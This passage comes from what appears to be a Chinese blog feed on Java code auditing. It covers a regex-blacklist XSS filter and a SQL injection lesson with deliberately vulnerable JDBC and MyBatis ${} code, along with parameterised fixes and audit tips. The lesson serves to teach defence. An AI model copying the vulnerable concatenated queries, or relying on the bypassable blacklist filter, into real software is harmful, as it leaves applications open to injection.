class="hljs-title">XssHttpServletRequestWrapper</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(request);<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String,String[]&gt; getParameterMap()&#123;<br>        Map&lt;String,String[]&gt; request_map = <span class="hljs-keyword">super</span>.getParameterMap();<br>        Iterator iterator = request_map.entrySet().iterator();<br>        <span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>            Map.Entry me = (Map.Entry)iterator.next();<br>            String[] values = (String[])me.getValue();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; values.length ; i++)&#123;<br>                values[i] = xssClean(values[i]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> request_map;<br>    &#125;<br>     <span class="hljs-keyword">public</span> String[] getParameterValues(String paramString)<br>      &#123;<br>        String[] arrayOfString1 = <span class="hljs-keyword">super</span>.getParameterValues(paramString);<br>        <span class="hljs-keyword">if</span> (arrayOfString1 == <span class="hljs-keyword">null</span>)<br>          <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">int</span> i = arrayOfString1.length;<br>        String[] arrayOfString2 = <span class="hljs-keyword">new</span> String[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)&#123;<br>            arrayOfString2[j] = xssClean(arrayOfString1[j]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> arrayOfString2;<br>      &#125;<br><br>      <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getParameter</span><span class="hljs-params">(String paramString)</span></span><br><span class="hljs-function">      </span>&#123;<br>        String str = <span class="hljs-keyword">super</span>.getParameter(paramString);<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span>)<br>          <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">return</span> xssClean(str);<br>      &#125;<br><br>      <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getHeader</span><span class="hljs-params">(String paramString)</span></span><br><span class="hljs-function">      </span>&#123;<br>        String str = <span class="hljs-keyword">super</span>.getHeader(paramString);<br>        <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span>)<br>          <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        str = str.replaceAll(<span class="hljs-string">&quot;\r|\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">return</span> xssClean(str);<br>      &#125;<br><br><br>      <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">xssClean</span><span class="hljs-params">(String value)</span> </span>&#123;<br>        <span class="hljs-comment">//ClassLoaderUtils.getResourceAsStream(&quot;classpath:antisamy-slashdot.xml&quot;, XssHttpServletRequestWrapper.class)</span><br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> It&#x27;s highly recommended to use the ESAPI library and</span><br>            <span class="hljs-comment">// uncomment the following line to</span><br>            <span class="hljs-comment">// avoid encoded attacks.</span><br>            <span class="hljs-comment">// value = encoder.canonicalize(value);</span><br>            value = value.replaceAll(<span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid anything between script tags</span><br>            Pattern scriptPattern = Pattern.compile(<span class="hljs-string">&quot;&lt;script&gt;(.*?)&lt;/script&gt;&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid anything in a src=&#x27;...&#x27; type of expression</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;src[\r\n]*=[\r\n]*\\\&#x27;(.*?)\\\&#x27;&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE | Pattern.MULTILINE<br>                            | Pattern.DOTALL);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br>            <span class="hljs-comment">// Avoid anything in a href=&#x27;...&#x27; type of expression</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;href[\r\n]*=[\r\n]*\\\&quot;(.*?)\\\&quot;&quot;</span>,<br>                                Pattern.CASE_INSENSITIVE | Pattern.MULTILINE<br>                                        | Pattern.DOTALL);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br><br>            <span class="hljs-comment">// Remove any lonesome &lt;/script&gt; tag</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;&lt;/script&gt;&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Remove any lonesome &lt;script ...&gt; tag</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;&lt;script(.*?)&gt;&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE | Pattern.MULTILINE<br>                            | Pattern.DOTALL);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid eval(...) expressions</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;eval\\((.*?)\\)&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE | Pattern.MULTILINE<br>                            | Pattern.DOTALL);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid expression(...) expressions</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;expression\\((.*?)\\)&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE | Pattern.MULTILINE<br>                            | Pattern.DOTALL);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid javascript:... expressions</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;javascript:&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid vbscript:... expressions</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;vbscript:&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br><br>            <span class="hljs-comment">// Avoid onload= expressions</span><br>            scriptPattern = Pattern.compile(<span class="hljs-string">&quot;onload(.*?)=&quot;</span>,<br>                    Pattern.CASE_INSENSITIVE | Pattern.MULTILINE<br>                            | Pattern.DOTALL);<br>            value = scriptPattern.matcher(value).replaceAll(<span class="hljs-string">&quot;&quot;</span>);<br>        &#125;  <br>          <span class="hljs-keyword">return</span> value; <br>          &#125;<br>&#125;<br><br><span class="hljs-comment">//3.使用工具类xssProtect</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">这是谷歌提供的一个用于过滤来自用户输入字段的XSS攻击的Java库</span><br><span class="hljs-comment">项目中需要引入 xssProtect-0.1.jar、antlr-3.0.1.jar、antlr-runtime-3.0.1.jar等3个 jar 包</span><br><span class="hljs-comment">*/</span><br><br>protectedAgainstXSS（String html）&#123;StringReader reader = <span class="hljs-keyword">new</span> StringReader（html）; StringWriter writer = <span class="hljs-keyword">new</span> StringWriter（）;<br>  <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 从“ html”变量解析传入的字符串</span><br>      HTMLParser.process( reader, writer, <span class="hljs-keyword">new</span> XSSFilter(), <span class="hljs-keyword">true</span> );<br><br>      <span class="hljs-comment">// 返回经过解析和处理的字符串</span><br>      <span class="hljs-keyword">return</span> writer.toString();<br>  &#125; <span class="hljs-keyword">catch</span> (HandlingException e) &#123;<br>  &#125;<br>&#125;<br><span class="hljs-comment">//具体的使用方式可以参考：https://www.iteye.com/blog/liuzidong-1744023</span><br></code></pre></td></tr></table></figure><p> <strong>找XSS的方法</strong></p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs TEXT">1.扫描器直接扫描，再去回溯<br>2.拿到一个项目主要是去看看，这个项目有没有一些过滤之类的组件。<br>  假设没有找到类似的过滤组件，则去随机找几个点去看看是不是存在XSS，<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java源代码审计-SQL注入</title>
    <link href="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="SQL-Injection基础"><a href="#SQL-Injection基础" class="headerlink" title="SQL Injection基础"></a>SQL Injection基础</h3><ol><li><p>概述</p><p> SQL注入（SQL injection），是发生于应用程序与数据库层的安全漏洞。只要是支持处理SQL指令的数据库服务器，都有可能受到此种手法的攻击。</p></li><li><p>原因</p><p> 未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。针对于SQL注入，则是用户提交的数据，被数据库系统编译而产生了开发者预期之外的动作。也就是，SQL注入是用户输入的数据，在拼接SQL语句的过程中，超越了数据本身，成为了SQL语句查询逻辑的一部分，然后这样被拼接出来的SQL语句被数据库执行，产生了开发者预期之外的动作。</p><p> 是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p></li><li><p>危害</p><ul><li>  数据库中存储的用户隐私信息泄漏；</li><li>  通过操作数据库对某些网页进行篡改；</li><li>  修改数据库一些字段的值，嵌入网马链接，进行挂马攻击；</li><li>  数据库服务器被恶意操作，系统管理员帐户被窜改；</li><li>  数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统；</li><li>  破坏硬盘数据，导致全系统瘫痪。</li></ul></li></ol><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><ol><li><p><strong>直接用servlet写SQL语句</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Vuln Code.</span><br><span class="hljs-comment">   * http://localhost:8080/sqli/jdbc/vuln?username=joychou</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> username username</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">//RequestMapping 这个controller表示匹配的URL</span><br>  <span class="hljs-meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span><br><span class="hljs-comment">//@RequestParam(&quot;username&quot;)获取从前端传过来的username参数</span><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">jdbc_sqli_vul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> </span>&#123;<br>    <br>      StringBuilder result = <span class="hljs-keyword">new</span> StringBuilder();<br>    <br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">//获取数据库连接</span><br>          Class.forName(driver);<br>          Connection con = DriverManager.getConnection(url, user, password);<br>    <br>          <span class="hljs-keyword">if</span> (!con.isClosed())<br>              System.out.println(<span class="hljs-string">&quot;Connect to database successfully.&quot;</span>);<br><br>         <span class="hljs-comment">// sqli vuln code  这里没有使用预处理的方式，直接将获取的参数和SQL语句拼接，导致注入。</span><br>          Statement statement = con.createStatement();<br>          String sql = <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>         <span class="hljs-comment">//终端打印sql</span><br>          logger.info(sql);<br>         <span class="hljs-comment">//执行拼接好的SQL语句</span><br>          ResultSet rs = statement.executeQuery(sql);<br>    <br>          <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>              String res_name = rs.getString(<span class="hljs-string">&quot;username&quot;</span>);<br>              String res_pwd = rs.getString(<span class="hljs-string">&quot;password&quot;</span>);<br>              String info = String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);<br>              result.append(info);<br>              logger.info(info);<br>          &#125;<br>          rs.close();<br>          con.close();<br>    <br>    <br>      &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>          logger.error(<span class="hljs-string">&quot;Sorry,can`t find the Driver!&quot;</span>);<br>      &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>          logger.error(e.toString());<br>      &#125;<br>      <span class="hljs-keyword">return</span> result.toString();<br>  &#125;<br></code></pre></td></tr></table></figure> <img src="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/SQL1.png" class="" title="java源代码审计-SQL注入"><p> <strong>安全代码</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * security code</span><br><span class="hljs-comment">     * http://localhost:8080/sqli/mybatis/sec01?username=joychou</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username username</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/mybatis/sec01&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mybatisSec01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userMapper.findByUserName(username);<br>    &#125;<br><br><span class="hljs-comment">//userMapper.jva</span><br>    <span class="hljs-meta">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br>    <span class="hljs-function">User <span class="hljs-title">findByUserName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span></span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * http://localhost:8080/sqli/mybatis/sec02?id=1</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> id id</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/mybatis/sec02&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mybatisSec02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Integer id)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userMapper.findById(id);<br>    &#125;<br><br><span class="hljs-comment">//userMapper.xml</span><br>    &lt;select id=<span class="hljs-string">&quot;findById&quot;</span> resultMap=<span class="hljs-string">&quot;User&quot;</span>&gt;<br>        select * from users where id = #&#123;id&#125;<br>    &lt;/select&gt;<br>      <br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * http://localhost:8080/sqli/mybatis/sec03</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/mybatis/sec03&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">mybatisSec03</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userMapper.OrderByUsername();<br>    &#125;<br><br><span class="hljs-comment">//userMapper.xml</span><br>    &lt;select id=<span class="hljs-string">&quot;OrderByUsername&quot;</span> resultMap=<span class="hljs-string">&quot;User&quot;</span>&gt;<br>        select * from users order by id asc limit <span class="hljs-number">1</span><br>    &lt;/select&gt;<br>      <br>      <br>    <span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title">mybatisOrderBySec04</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//userMapper.xml     </span><br><span class="hljs-comment">//过滤mybatis中order by不能用#的情况。 严格限制用户输入只能包含&lt;code&gt;a-zA-Z0-9_-.&lt;/code&gt;字符。下面有介绍另一种</span><br>    &lt;select id=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> parameterType=<span class="hljs-string">&quot;String&quot;</span> resultMap=<span class="hljs-string">&quot;User&quot;</span>&gt;<br>        select * from users<br>        &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">&quot;order != null&quot;</span>&gt;<br>            order by $&#123;order&#125; asc<br>        &lt;/if&gt;<br>    &lt;/select&gt;<br><br><span class="hljs-comment">//SecurityUtil.sqlFilter(sort)</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">sqlFilter</span><span class="hljs-params">(String sql)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!FILTER_PATTERN.matcher(sql).matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sql;<br>    &#125;  <br></code></pre></td></tr></table></figure><p> <strong>知识补充</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select</span>注解的目的是为了取代xml中的select标签，只作用于方法上面。<br>源码：<br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Select<br>&#123;<br>    String[] value();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">源码说明了</span><br><span class="hljs-comment">（1）<span class="hljs-doctag">@Select</span>注解只能修饰方法</span><br><span class="hljs-comment">（2）<span class="hljs-doctag">@Select</span>注解的值是字符数组。</span><br><span class="hljs-comment"><span class="hljs-doctag">@Select</span>注解的值是字符数组，但是真正生效的应该是最后那条SQL语句。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//普通的字符串值，只能实现变量的替换功能</span><br><span class="hljs-meta">@Select(&quot;select * from t_person where id = #&#123;id&#125;&quot;)</span><br><span class="hljs-function">Person <span class="hljs-title">selectPersonById</span><span class="hljs-params">(Integer id)</span></span>;<br><br><span class="hljs-meta">@Insert</span>，<span class="hljs-meta">@Update</span>... 同理<br>  <br>    <br>&lt;select id=<span class="hljs-string">&quot;findByUserNameVuln02&quot;</span> parameterType=<span class="hljs-string">&quot;String&quot;</span> resultMap=<span class="hljs-string">&quot;User&quot;</span>&gt;<br>select * from users where username like <span class="hljs-string">&#x27;%$&#123;_parameter&#125;%&#x27;</span><br>&lt;/select&gt;  <br><span class="hljs-comment">//$&#123;_parameter&#125; ：当只有一个参数，可以使用_parameter，它就代表了这个参数</span><br>  <br>  <br><span class="hljs-comment">//!FILTER_PATTERN.matcher(sql).matches()   </span><br><span class="hljs-comment">//方法java.time.Matcher.matches()将给定区域与指定模式进行匹配。如果区域序列与Matcher的模式匹配，则返回true，否则返回false。</span><br></code></pre></td></tr></table></figure></li><li><p><strong>Mybatis框架下易产生SQL注入漏洞场景分析</strong></p><p> 在基于Mybatis框架的Java白盒代码审计工作中，通常将着手点定位在Mybatis的配置文件中。通过查看这些与数据库交互的配置文件来确定SQL语句中是否存在拼接情况，进而确立跟踪点。通过总结，Mybatis框架下易产生SQL注入漏洞的情况主要分为以下三种：</p><p> <strong>模糊查询like</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Select * from news where title like ‘%#&#123;title&#125;%’，<br><span class="hljs-comment">//由于这样写程序会报错，研发人员将SQL查询语句修改如下：</span><br>Select * from news where title like ‘%$&#123;title&#125;%’，<br><span class="hljs-comment">//在这种情况下我们发现程序不再报错，但是此时产生了SQL语句拼接问题，如果java代码层面没有对用户输入的内容做处理势必会产生SQL注入漏洞。</span><br></code></pre></td></tr></table></figure><p> <strong>in之后的参数</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Select * <span class="hljs-function">from news where id <span class="hljs-title">in</span> <span class="hljs-params">(#&#123;id&#125;)</span>，</span><br><span class="hljs-function"><span class="hljs-comment">//由于这样写程序会报错，研发人员将SQL查询语句修改如下：</span></span><br><span class="hljs-function">Select * from news where id <span class="hljs-title">in</span> <span class="hljs-params">($&#123;id&#125;)</span>，</span><br><span class="hljs-function"><span class="hljs-comment">//修改SQL语句之后，程序停止报错，但是却引入了SQL语句拼接的问题，如果研发人员没有对用户输入的内容做过滤，势必会产生SQL注入漏洞。</span></span><br></code></pre></td></tr></table></figure><p> <strong>order by之后</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Select * from news where title =‘京东’ order by #&#123;time&#125; asc，<br><span class="hljs-comment">//由于发布时间time不是用户输入的参数，无法使用预编译。研发人员将SQL查询语句修改如下：</span><br>Select * from news where title =‘京东’ order by $&#123;time&#125; asc，<br><span class="hljs-comment">//修改之后，程序通过预编译，但是产生了SQL语句拼接问题，极有可能引发SQL注入漏洞。</span><br></code></pre></td></tr></table></figure></li><li><p><strong>Mybatis框架下SQL注入漏洞修复建议</strong></p><p> <strong>模糊查询like</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">select * <span class="hljs-function">from news where tile like <span class="hljs-title">concat</span><span class="hljs-params">(‘%’,#&#123;title&#125;, ‘%’)</span>，</span><br><span class="hljs-function"><span class="hljs-comment">//用concat，采用预编译机制，避免了SQL语句拼接的问题，从根源上防止了SQL注入漏洞的产生。</span></span><br></code></pre></td></tr></table></figure><p> <strong>in之后的参数</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">select * from news where id in<br>&lt;foreach collection=&quot;ids&quot; item=&quot;item&quot; open=&quot;(&quot;separator=&quot;,&quot; close=&quot;)&quot;&gt;#&#123;item&#125; &lt;/foreach&gt;<br><br> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment">一个个参数预编译拼接SQL语句查询</span><br><span class="hljs-comment">&lt;foreach&gt;&lt;/foreach&gt;标签 当传入参数为数组或者集合时进行遍历</span><br><span class="hljs-comment"> collection:指定输入对象中集合属性</span><br><span class="hljs-comment"> item:每次遍历生成的对象</span><br><span class="hljs-comment"> open:开始遍历时拼接的串</span><br><span class="hljs-comment"> separator:每次迭代的分隔符</span><br><span class="hljs-comment"> close:结束遍历时两个对象需要拼接的串</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p> <strong>order by之后</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**前面用正则匹配的方式</span><br><span class="hljs-comment"> 针对order by这种情况研发人员还可以在java层面做映射来进行解决。如当存在发布时间time和点击量click两种排序选择时，我们可以限制用户只能输入1和2。参数化接受请求。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="实战中的SQL注入漏洞挖掘"><a href="#实战中的SQL注入漏洞挖掘" class="headerlink" title="实战中的SQL注入漏洞挖掘"></a>实战中的SQL注入漏洞挖掘</h2><p>1、自动化工具扫描，一般使用fortify，根据扫出来的结果去做一个跟踪。</p><p>2、使用全局搜索的功能搜索<strong>Statement</strong> 、**${** 根据查找的结果进行回溯。</p><p>如：**${**</p><img src="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/SQL2.png" class="" title="java源代码审计-SQL注入"><p>IDEA 的Free Mabatis Tool插件可以在UserMapper.xml中直接让你找到对应方法的引用文件</p><img src="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/SQL3.png" class="" title="java源代码审计-SQL注入"><p>Mac下 <strong>cmd+鼠标左键</strong></p><p>windows下 <strong>ctrl+鼠标左键</strong></p><img src="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/SQL4.png" class="" title="java源代码审计-SQL注入"><p>回溯到对应的controller</p><img src="/2023/02/02/java%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/SQL5.png" class="" title="java源代码审计-SQL注入"><p>可以看到整个过程没有任何的过滤，直接获取参数传入，同时没有采用预编译的方式写SQL拼接，所以产生了注入。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java源代码审计-服务端请求伪造</title>
